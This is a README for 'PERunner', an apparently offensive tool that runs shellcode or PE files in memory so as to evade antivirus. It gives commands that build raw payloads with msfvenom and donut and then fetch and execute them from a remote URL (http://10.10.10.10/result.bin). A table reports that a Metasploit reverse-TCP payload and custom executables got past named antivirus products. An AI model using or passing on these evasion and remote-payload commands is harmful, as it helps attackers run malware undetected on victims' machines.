# PERunner
Runs RAW or PE file in memory, avoiding AV.
First generate RAW with shellcoding.py (Requires https://github.com/TheWover/donut in current directory). 
Example of usage:

`python3 shellcoding.py -t msf -p 'msfvenom -a x86 --platform Windows -p windows/exec CMD="calc.exe" -f raw'`

`python3 shellcoding.py -t pe -p your_exe_not_in_golang.exe `

Next run pe.exe with -u params and path the url to result.bin

`pe.exe -u http://10.10.10.10/result.bin`


| Tested AV     | MSF_REV_TCP   | OWN PE |
| ------------- |:-------------:|:-----:|
| AVAST     | ✅ | ✅ |
| ESET      | ✅ | ✅ |
| DrWEB     | ✅ | ✅ |
| 360Sec    | ✅ | ✅ |
| KASPERSKY | ⬜️ | ✅ |
| AVG       | ✅ | ✅ |
